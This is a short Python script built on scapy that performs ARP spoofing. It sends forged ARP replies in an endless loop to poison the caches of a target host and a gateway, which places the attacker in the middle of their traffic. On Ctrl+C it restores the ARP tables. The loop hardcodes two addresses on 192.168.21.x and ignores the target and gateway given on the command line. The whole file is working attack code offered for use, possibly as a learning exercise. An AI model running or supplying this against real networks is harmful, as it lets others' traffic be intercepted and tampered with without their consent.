#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse


def get_command():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Give target ip")
    parser.add_option("-n", "--network", dest="network", help="Give gateway ip of the network")
    (commands, argument) = parser.parse_args()
    return commands


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


command = get_command()
spoof(str(command.target), str(command.network))


try:
    sent_packets_count = 0
    while True:
        spoof("192.168.21.254", "192.168.21.2")
        spoof("192.168.21.2", "192.168.21.254")
        sent_packets_count += 2
        print("\r[+]  Packets sent:" + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected Ctrl + C ..... Resetting ARP tables....Please wait.\n")
    restore(command.target, command.network)
